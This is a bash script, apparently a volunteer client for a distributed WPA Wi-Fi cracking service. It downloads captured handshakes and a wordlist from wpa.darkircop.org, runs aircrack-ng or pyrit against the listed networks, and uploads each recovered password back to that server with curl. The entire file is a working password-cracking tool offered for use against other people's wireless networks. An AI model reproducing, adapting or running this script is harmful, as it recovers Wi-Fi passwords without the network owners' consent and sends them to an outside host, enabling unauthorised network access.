#!/bin/bash

unset LANG

echo help_crack.sh version 9

OWNWL=0
WL=darkircop.txt
WLSHA1=""
FILT1="<td></td>"
FILT2="<b>"
PASSWORD=""
CID=""
SPEED=0
PYRIT=0
PATH=$PATH:/usr/sbin

get_nets()
{
	NETS=`curl -s -A crackhelp "http://wpa.darkircop.org/index.php?off=0&limit=-1" \
		| grep "<tr" \
		| grep name=\"pass- \
		| grep "$FILT1" \
		| grep -v "$FILT2" \
		| sed -e 's/.*pass-//' \
                | awk -F \" '{print $1}' \
		| sed -e 's/-/:/g'`

	N=""
	NUM=0

	for NET in $NETS ; do
		grep $NET pass.log > /dev/null 2> /dev/null

		if [ $? -ne 0 ] ; then
			N="$N $NET"
			NUM=`expr $NUM + 1`
		fi
	done

	NETS=$N

	echo $NUM networks to crack
}

do_cmd()
{
	curl -s -A crackhelp \
		-d "$1" \
		http://wpa.darkircop.org/ \
		| grep status \
		| grep OK > /dev/null

	if [ $? -ne 0 ] ; then
		echo "bad cmd"
	fi
}

extract_net()
{
	tcpdump -h > /dev/null 2> /dev/null

	if [ $? -ne 1 ] ; then
		return
	fi

	echo Extracting $NET

	tcpdump -r wpa.cap -s0 -w wpa.cap.tmp ether host $NET
	mv wpa.cap.tmp wpa.cap
}

do_crack()
{
	echo Cracking $NET

	rm -f wpa.cap.gz wpa.cap
	wget --quiet -U crackhelp http://wpa.darkircop.org/cap/wpa.cap.gz
	gzip -d wpa.cap.gz

	if [ $OWNWL -eq 0 ] ; then
		get_wl
		do_cmd "op=crack&bssid=$NET&id=$CID"
	fi

	PF=pass-$NET

	extract_net

	if [ $PYRIT -eq 1 ] ; then
		pyrit -r wpa.cap -i $WL -b $NET -o $PF attack_passthrough 2> $PF-err
	else
		aircrack-ng -w $WL -l $PF -b $NET wpa.cap
	fi

	PASS=`cat $PF 2> /dev/null`

	rm -f $PF

	if [ "$PASS" = "" ] ; then
		if [ $PYRIT -eq 1 ] ; then
			grep "Password was not found" $PF-err > /dev/null 2> /dev/null
			RC=$?

			rm -f $PF-err

			if [ $RC -ne 0 ] ; then
				# XXX we need to remove the "cracking" status from net
				echo "Pyrit and aircrack disagree on validity..."
				return
			fi
		fi

		echo Crack for $NET failed
		echo "$NET nope" >> pass.log

		if [ $OWNWL -eq 0 ] ; then
			do_cmd "op=result&result=$PASS&pass=$PASSWORD&wl=$WLSHA1&bssid=$NET&id=$CID"
		fi

		return
	fi

	rm -f $PF-err

	echo Pass for $NET is $PASS

	echo "$NET $PASS" >> pass.log

	N=`echo $NET | sed -e 's/:/-/g'`

	curl -s -A crackhelp -d "save=Save&comment-$N=&id=$CID" \
		--data-urlencode "pass-$N=$PASS" \
		http://wpa.darkircop.org/index.php \
		| grep status \
		| grep "Info saved" > /dev/null

	if [ $? -ne 0 ] ; then
		echo "Can't upload the shit"
		exit 1
	fi
}

get_random()
{
	X=$RANDOM
	X=`expr $X % $NUM`

	for i in $NETS; do
		NET=$i

		if [ $X -eq 0 ] ; then
			break;
		fi

		X=`expr $X - 1`
	done
}

crack_one()
{
	get_nets

	if [ $NUM -eq 0 ] ; then
		return 0
	fi

	get_random
	do_crack
	return 1

	for NET in $NETS ; do
		do_crack
	done

	return 0
}

get_ac()
{
	pyrit 2> /dev/null > /dev/null

	if [ $? -eq 0 ] ; then
		PYRIT=1
		echo Using pyrit
		return
	fi

	aircrack-ng 2> /dev/null > /dev/null

	if [ $? -ne 1 ] ; then
		echo Install aircrack or pyrit
		exit 1
	fi
}

do_get_wl()
{
	echo Grabbing word list

	rm -f darkircop.txt.gz darkircop.txt

	wget -U crackhelp http://wpa.darkircop.org/wl/darkircop.txt.gz
	gzip -d darkircop.txt.gz

	grep -v nope pass.log > pass.log.tmp 2> /dev/null
	mv -f pass.log.tmp pass.log

	echo Wordlist word count: `wc -l darkircop.txt`

	WLSHA1=`sha1sum darkircop.txt | awk '{print $1}'`
}

get_wl()
{
	stat $WL 2> /dev/null > /dev/null
	if [ $? -eq 1 ] ; then
		do_get_wl
		return
	fi

	SZ=`ls -l $WL  | awk '{print $5}'`

	S=`printf "HEAD /wl/$WL HTTP/1.0\r\nHost: wpa.darkircop.org\r\nUser-Agent: crackhelp\r\n\r\n" \
		| nc wpa.darkircop.org 80 \
		| grep "Content-Length" \
		| awk '{print $2}' \
		| tr -d '\r'`

	if [ "$SZ" != "$S" ] ; then
		do_get_wl
	fi
}

print_help()
{
	echo "Usage: help_crack.sh [opts] [wordfile]"
	echo "-h	Help"
	echo "-p	<password>"

	exit 1
}

do_ping()
{
	CID=$1

	echo "Pinging CID $CID"

	sleep 1

	while true ; do
		do_cmd "op=ping&id=$CID"
		sleep 666
	done
}

cleanup()
{
	killall -9 aircrack-ng 2> /dev/null
	killall -9 pyrit 2> /dev/null

	if [ $OWNWL -eq 0 ] ; then
		do_cmd "op=delete&id=$CID"
	fi

	killall -9 help_crack.sh

	exit
}

crack_darkircop()
{
	echo "Crack new shit"
	FILT1="<td></td><td></td><td></td>"
	FILT2="<b>"
	crack_one
	if [ $? -ne 0 ] ; then
		return 1
	fi

	echo "Cracking uncracked shit"
	FILT1="<td></td>"
	FILT2="<b>"
	crack_one
	if [ $? -ne 0 ] ; then
		return 1
	fi

	if [ "$PASSWORD" != "" ] ; then
		echo "Cracking untrusted shit"
		FILT1="untrusted"
		FILT2="<b>"
		crack_one
		if [ $? -ne 0 ] ; then
			return 1
		fi
	fi

	echo "Cracking stuff (apparently) being cracked - beat the race"
	FILT1="<b>"
	FILT2="isuckatscriptinglsadjfalsjflsakjfaskfalkdjalkdjf"
	crack_one
	if [ $? -ne 0 ] ; then
		return 1
	fi

	return 0
}

get_speed()
{
	echo "Getting speed"

	if [ $PYRIT -eq 1 ] ; then
		SPEED=`pyrit benchmark | grep Computed | awk '{printf "%d", $2}'`
		return
	fi

	aircrack-ng --help | grep -- "-S" > /dev/null

	if [ $? -ne 0 ] ; then
		echo "Your aircrack doesn't report speed"
		echo "Grab the latest SVN version"
		sleep 2
		return
	fi

	echo "Testing aircrack speed"

	SPEED=`aircrack-ng -S \
		| tr '\r' '\n' \
		| tail -n 2 \
		| head -n 1 \
		| awk '{print $1}'`
}

while getopts hp:z: o
do	case "$o" in
	p)	PASSWORD="$OPTARG";;
	h)	print_help;;
	z)	do_ping "$OPTARG";;
	[?])	print_help;;
	esac
done

get_ac
get_speed

echo "Your speed is $SPEED"

shift `expr $OPTIND - 1`

if [ $# -gt 0 ] ; then
	WL=$1
	FILT1=".*"
	FILT2="isuckatscriptinglsadjfalsjflsakjfaskfalkdjalkdjf"
	OWNWL=1

	echo Using own wordlist: $WL
else
	WLSHA1=`sha1sum darkircop.txt | awk '{print $1}'`
	get_wl

	CID=`curl -s -A crackhelp \
		-d "op=new&pass=$PASSWORD&speed=$SPEED" \
		http://wpa.darkircop.org/`

	echo "Cid $CID"

	$0 -z $CID &
fi

trap "cleanup" INT TERM

stat pass.log 2> /dev/null > /dev/null
if [ $? -eq 0 ] ; then
	echo WARNING pass.log found with `wc -l pass.log` entries.
	echo Delete it if you changed word list or want to start over.
	sleep 2
fi

while true ; do
	if [ $OWNWL -eq 0 ] ; then
		crack_darkircop
	else
		crack_one
	fi

	if [ $? -eq 0 ] ; then
		echo "Waiting for more handshakes"
		sleep 666
	fi
done
